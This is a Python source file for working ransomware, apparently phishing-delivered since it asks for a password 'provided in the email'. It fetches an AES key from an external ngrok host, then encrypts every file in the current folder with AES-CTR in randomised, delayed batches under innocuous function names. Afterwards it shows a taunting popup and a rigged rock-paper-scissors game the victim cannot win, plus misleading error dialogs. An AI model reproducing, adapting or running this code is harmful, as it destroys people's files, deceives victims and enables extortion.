import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
from cryptography.hazmat.backends import default_backend
import requests
import tkinter as tk
from tkinter import simpledialog, messagebox
import hashlib
import random
import time
import tkinter as tk
from tkinter import messagebox, simpledialog

mode = "active"

def get_key_from_endpoint(random_path):
    # Construct the key retrieval URL
    key_url = f"https://squirrel-pet-bengal.ngrok-free.app/key/{random_path}"
    try:
        # Fetch the key from the server
        response = requests.get(key_url)
        response.raise_for_status()  # Raise an error for HTTP issues
        raw_key = response.text.strip()  # Ensure no extra spaces or newlines
        hashed_key = hashlib.sha256(raw_key.encode()).digest()[:16]  # Derive a 16-byte key
        messagebox.showerror("Key Retrieval Failed", "The certificate could not be retrieved. The time has passed, and the password is now invalid.")
        return hashed_key
    except Exception as e:
        print(f"Failed to retrieve the key: {e}")
        return None

def run_vector(input_data: bytes, config_token: bytes) -> bytes:
    nonce_seed = os.urandom(12)
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce_seed + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
    output_blob = session.update(input_data) + session.finalize()
    return nonce_seed + output_blob  # return raw binary blob

def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
    nonce = blob[:12]
    ciphertext = blob[12:]
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
    return session.update(ciphertext) + session.finalize()

def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
    # Step 1: Collect and shuffle files
    file_paths = []
    file_sizes = []
    script_path = os.path.abspath(__file__)  # Get the absolute path of this script

    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            path = os.path.join(dirpath, asset)
            if os.path.abspath(path) == script_path:  # Exclude this script
                continue
            file_paths.append(path)
            file_sizes.append(os.path.getsize(path))  # Get file size

    # Pair file paths with their sizes and shuffle
    files_with_sizes = list(zip(file_paths, file_sizes))
    random.shuffle(files_with_sizes)

    total_files = len(files_with_sizes)
    if total_files == 0:
        print("No files found.")
        return

    # Calculate the total size of all files
    total_size = sum(size for _, size in files_with_sizes)

    # Step 2: Process files in batches with delays
    start_time = time.time()
    i = 0
    while i < total_files:
        # Determine batch size (randomized between 2 and 5 files)
        batch_size = random.randint(2, 5)
        batch_files = files_with_sizes[i:i + batch_size]
        batch_total_size = sum(size for _, size in batch_files)

        # Process the batch
        for j, (path, size) in enumerate(batch_files, start=1):
            try:
                with open(path, 'rb') as f:
                    data = f.read()
                byeBye = run_vector(data, config_token)
                with open(path, 'wb') as f:
                    f.write(byeBye)
                print(f"[{i + j}/{total_files}] bye bye: {path}")
            except Exception:
                print(f"[{i + j}/{total_files}] Failed: {path}")

        # Update index
        i += batch_size

        # Calculate delay based on batch size and distribute over total duration
        elapsed_time = time.time() - start_time
        remaining_time = max(total_duration - elapsed_time, 0)
        delay = min((batch_total_size / total_size) * total_duration, remaining_time / ((total_files - i) / batch_size + 1))
        if i < total_files:  # Avoid delay after the last batch
            print(f"⏳ Delaying for {delay:.2f} seconds...\n")
            time.sleep(delay)

def restore_assets(asset_dir: str, config_token: bytes):
    script_path = os.path.abspath(__file__)  # Get the absolute path of this script

    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            asset_path = os.path.join(dirpath, asset)
            if os.path.abspath(asset_path) == script_path:  # Exclude this script
                continue

            try:
                with open(asset_path, 'rb') as f:
                    blob = f.read()

                restored = reverse_vector(blob, config_token)

                with open(asset_path, 'wb') as f:
                    f.write(restored)
            except Exception:
                pass  

def show_popup():
    root = tk.Tk()
    root.withdraw()

    response = messagebox.askquestion(
        "💀 Oops... Files are bye byed!",
        "🎉 Surprise! Your precious files are now on vacation — permanently.\n\n"
        "But hey, I’m feeling generous today...\n"
        "Would you like a *totally fair* chance to win them back?\n\n"
        "Click YES to 'Play a Game'\n"
        "Click NO to 'Lose Everything Like a Legend' 💀"
    )

    if response == "yes":
        play_game()
    else:
        global mode
        mode = "restore"  # Change the mode to restore
        messagebox.showinfo("Womp Womp..", "You chose not to play. Your files will be restored 3shan khatrak bas.")

def play_game():
    global mode  # allows us to update the global `mode`

    options = ["rock", "paper", "scissors"]
    computer_choices = ["rock", "paper", "scissors"]  # Predefined winning choices
    user_wins = 0
    computer_wins = 0

    for attempt in range(1, 11):  # Limit to 10 rounds
        if user_wins == 3 or computer_wins == 3:  # End game if either reaches 3 wins
            break

        user_choice = simpledialog.askstring(
            "Rock, Paper, Scissors 🎮",
            f"Round {attempt}:\nChoose rock, paper, or scissors:"
        )
        if not user_choice or user_choice.lower().strip() not in options:
            messagebox.showwarning("❌ Invalid Choice", "Please choose rock, paper, or scissors.")
            continue

        user_choice = user_choice.lower().strip()
        if user_choice == "rock":
            computer_choice = computer_choices[1]  # Paper beats Rock
        elif user_choice == "paper":
            computer_choice = computer_choices[2]
        elif user_choice == "scissors":
            computer_choice = computer_choices[0]
        else:
            computer_choice = random.choice(computer_choices)

        if user_choice == computer_choice:
            messagebox.showinfo("🤝 Tie", f"Both chose {user_choice}. It's a tie!")
        else:
            computer_wins += 1
            messagebox.showinfo("💻 Computer Wins", f"You chose {user_choice}, computer chose {computer_choice}. Computer wins this round!")

    if computer_wins == 3:
        messagebox.showerror("💀 Game Over", "You lost the game. The only way to decrypt is by choosing not to play.")

# === SYSTEM EXECUTION ===
if __name__ == "__main__":
    import time
    resources_folder = os.getcwd()  # Use the current folder as the target folder

    root = tk.Tk()
    root.withdraw()  # Hide the main tkinter window

    random_path = simpledialog.askstring("Input Required", "Enter the random path (password) provided in the email:")

    # Retrieve the key using the provided random path
    key = get_key_from_endpoint(random_path)
    print(key)
    if not key:
        messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
        exit(1)

    if mode == "active":
        start = time.time()
        scan_and_patch_assets(resources_folder, key)
        end = time.time()
        print(f"bye bye finished in {end - start:.2f} seconds.")
        show_popup()  # ← may change mode to "restore"

    if mode == "restore":
        restore_assets(resources_folder, key)
        print("Files restored successfully.")